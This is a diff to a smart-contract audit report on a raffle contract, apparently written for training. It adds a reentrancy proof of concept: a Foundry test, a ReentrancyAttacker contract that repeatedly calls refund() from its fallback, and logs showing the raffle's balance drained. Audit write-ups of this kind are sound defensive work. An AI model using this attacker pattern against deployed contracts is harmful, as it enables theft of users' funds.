@@ -16,7 +16,9 @@
 **Proof of Concept:**
 
 If we enter 2 sets of a thousand players, the costs will be as following
+
 Gas cost for entering the first 1000 players: 417422122
+
 Gas cost for entering the second 1000 players: 1600800307
 
 This is 3.8 times more cost.
@@ -165,19 +167,89 @@ Place the following into your PuppyRaffleTest.t.sol
 
 **Proof of Concept:**
 
-If we enter 2 sets of a thousand players, the costs will be as following
-Gas cost for entering the first 1000 players: 417422122
-Gas cost for entering the second 1000 players: 1600800307
+This attack required an attacking contract to be in receipt of the funds. The following is the output of the test demonstrating the attack.
 
-This is 3.8 times more cost.
+Logs:
+
+Starting balance of PuppyRaffle is: 4000000000000000000
+
+Starting balance of Attacker is: 0
+
+Ending balance of PuppyRaffle is: 0
+
+Ending balance of Attacker is: 5000000000000000000
 
 <details>
 <summary> PoC </summary>
 
-Place the following into your PuppyRaffleTest.t.sol
+Place the following test into your PuppyRaffleTest.t.sol
 
 ```javascript
+    function test_ReentrancyAttack() public {
+        address[] memory players = new address[](4);
+        players[0] = address(1);
+        players[1] = address(2);
+        players[2] = address(3);
+        players[3] = address(4);
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
 
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 1 ether);
+
+        uint256 attackerContractStartingBalance = address(attackerContract).balance;
+        uint256 puppyRaffleStartingBalance = address(puppyRaffle).balance;
+
+        console.log("Starting balance of PuppyRaffle is: ", puppyRaffleStartingBalance);
+        console.log("Starting balance of Attacker is: ", attackerContractStartingBalance);
+
+        vm.prank(attacker);
+        attackerContract.attack{value: entranceFee}();
+
+        uint256 attackerContractEndingBalance = address(attackerContract).balance;
+        uint256 puppyRaffleEndingBalance = address(puppyRaffle).balance;
+
+        console.log("Ending balance of PuppyRaffle is: ", puppyRaffleEndingBalance);
+        console.log("Ending balance of Attacker is: ", attackerContractEndingBalance);
+    }
+```
+
+And the following attacking contract in the same file
+
+```javascript
+contract ReentrancyAttacker {
+
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee = 1e18;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle){
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealBalance() internal {
+        if(address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable{
+        _stealBalance();
+    }
+
+    receive() external payable{
+        _stealBalance();
+    }
+}
 ```
 
 </details>
